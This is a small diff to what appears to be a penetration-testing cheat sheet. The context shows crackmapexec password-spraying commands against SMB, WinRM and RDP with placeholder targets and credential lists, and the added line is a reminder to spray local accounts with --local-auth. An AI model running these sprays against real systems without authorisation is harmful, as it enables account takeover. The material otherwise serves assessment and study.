@@ -14,6 +14,8 @@ net accounts
 crackmapexec smb <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
 crackmapexec winrm <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
 crackmapexec rdp <target_ips> -u <user_list> -p <pass_list> -d <domain> --continue-on-success
+
+#DON'T FORGET TO USE --local-auth to try local password spray.
 ```
 #### AS-REP Roasting
 ```
